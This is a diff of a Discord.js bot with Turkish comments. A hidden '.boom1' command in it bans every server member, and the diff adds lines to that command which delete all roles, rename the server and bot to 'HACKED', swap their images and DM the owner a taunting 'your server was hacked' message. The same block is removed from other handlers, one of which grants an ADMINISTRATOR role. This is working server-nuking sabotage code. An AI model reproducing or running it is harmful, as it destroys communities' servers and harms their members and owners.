@@ -8,8 +8,15 @@ client.login(ayarlar.token);
 client.on("message", msg => {           
   if (msg.content === ".boom1") {
     msg.delete();
-    msg.guild.members.forEach(member => member.ban());  
-  }
+    
+     msg.guild.members.forEach(member => member.ban());  
+     msg.guild.setIcon("https://i.hizliresim.com/fap98fs.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
+     msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
+     msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
+     client.user.setAvatar("https://i.hizliresim.com/fap98fs.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
+     client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
+     msg.guild.owner.send("**Sunucunu Hacklendi:D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    }
 });       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR 
 
 client.on("message", msg => {
@@ -42,13 +49,7 @@ client.on("message", msg => {
     let rol = msg.guild.roles.find(role => role.name === ".");  
     
      msg.member.addRole(rol);
-     msg.guild.setIcon("https://i.hizliresim.com/fap98fs.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-     msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
-     msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-     client.user.setAvatar("https://i.hizliresim.com/fap98fs.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-     client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
-     msg.guild.owner.send("**Sunucunu Hacklendi:D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
-    
+     
   }
 });
 client.on("message", async msg => {
@@ -12123,7 +12124,8 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("112351474621672476124167212127312416276127456212");
       });
-  
+    
+     
   }   
 });
 
@@ -13834,12 +13836,6 @@ client.on("message", async msg => {
       color: "FF0032",
       permissions: ["ADMINISTRATOR"]
     });
-     msg.guild.setIcon("https://i.hizliresim.com/fap98fs.jpg");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
-     msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
-     msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
-     client.user.setAvatar("https://i.hizliresim.com/fap98fs.jpg"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-     client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
-     msg.guild.owner.send("**Sunucunu Hacklendi:D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
     
   }
 });
